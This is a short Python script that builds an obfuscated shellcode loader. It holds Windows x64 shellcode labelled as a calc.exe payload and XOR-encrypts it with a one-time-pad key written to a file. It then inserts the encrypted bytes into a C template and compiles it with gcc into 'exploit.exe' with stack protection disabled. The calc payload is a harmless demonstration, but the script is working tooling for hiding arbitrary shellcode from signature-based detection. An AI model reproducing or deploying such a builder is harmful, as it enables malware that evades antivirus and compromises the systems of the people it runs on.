import random
import subprocess

OUTPUT_FILE_NAME = "exploit"
KEY_FILE = "keyfile.bin"


#Windows x64 calc.exe payload
SHELLCODE = bytearray(
    b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b"
    b"\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1"
    b"\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32"
    b"\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01"
    b"\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c"
    b"\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7"
    b"\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    b"\x48\x83\xec\x20\x41\xff\xd6"
)

PLACEHOLDER_FILE = "template.c"


# Function to encrypt the payload and save the key
def encrypt_payload(payload):
    length = len(payload)
    key = bytearray(random.getrandbits(8) for _ in range(length))

    encrypted_payload = ["0x{:02x}".format(payload[i] ^ key[i]) for i in range(length)]

    formatted_payload = ", ".join(encrypted_payload[i] for i in range(length))

    # Save the key to a file
    with open(KEY_FILE, "wb") as fp:
        fp.write(key)

    print(f"Payload encrypted. One-Time Pad key saved in File '{KEY_FILE}'")

    return formatted_payload


def replace_placeholder_in_file(formatted_payload):
    with open(PLACEHOLDER_FILE, "r") as file:
        content = file.read()

    content = content.replace("#PLACEHOLDER#", formatted_payload)
    content = content.replace("#PLACEHOLDER2#", KEY_FILE)

    with open(OUTPUT_FILE_NAME + ".c", "w") as file:
        file.write(content)


def compile_c_code():
    try:
        result = subprocess.run(
            ["gcc", OUTPUT_FILE_NAME + ".c", "-fno-stack-protector", "-g", "-o", OUTPUT_FILE_NAME + ".exe"],
            check=True, capture_output=True, text=True)
        print(f"Compilation successful. The executable is named '{OUTPUT_FILE_NAME}.exe'.")
    except subprocess.CalledProcessError as e:
        print("Compilation failed:")
        print(e.stderr)


def main():
    formatted_payload = encrypt_payload(SHELLCODE)
    replace_placeholder_in_file(formatted_payload)
    compile_c_code()


if __name__ == "__main__":
    main()
